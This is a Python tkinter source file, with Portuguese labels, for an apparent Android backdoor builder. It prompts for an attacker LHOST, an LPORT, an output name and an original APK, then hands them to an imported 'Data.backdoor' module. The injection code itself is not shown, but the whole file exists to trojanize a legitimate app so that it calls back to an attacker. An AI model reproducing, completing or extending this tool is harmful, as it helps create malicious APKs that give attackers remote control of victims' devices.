from tkinter import *
from tkinter import filedialog
import Data.backdoor as ini


def lhost():
    global lij, Lij, Eij, Bij
    Lij = Label(lij, text='LHOST : ')
    Lij.pack()
    Eij = Entry(lij)
    Eij.pack(pady=10)
    Fij = Frame(lij)
    Fij.pack()
    Bij = Button(Fij, text='OK', command=pega, width=5)
    Bij.pack(side=LEFT)
    Bij2 = Button(Fij, text='EXIT', command=exit, width=5)
    Bij2.pack(side=LEFT, padx=10)
    Eij.focus_force()
    lij.grab_set()  # força ficar no toplevel
    lij.title('>>>>   LHOST   <<<<')
    lij.geometry('320x90+500+255')
    lij.lift()


def pega():
    global lh
    lh = Eij.get()
    lij.title('>>>>   LPORT   <<<<')
    Lij['text'] = 'LPORT : '
    Eij.delete(0, END)
    Bij['command'] = pegap
    Eij.focus_force()


def pegap():
    global lp
    lp = Eij.get()
    lij.title('>>>  OUTPUT  <<<')
    Lij['text'] = 'NOME : '
    Eij.delete(0, END)
    Bij['command'] = pegan
    Eij.focus_force()


def pegan():
    global nome, fileal
    nome = Eij.get()
    fileal = filedialog.askopenfilename(initialdir="", title="Selecione o APK ORIGINAL",
                                        filetypes=(("Arquivos do tipo APK", "* .apk"), ("todos os arquivos", "*. *")))
    lista = [nome, fileal, lh, lp]
    lij.destroy()
    ini.done2(lista)
    exit()


def main():
    global lij
    lij = Tk()
    lhost()
    lij.mainloop()

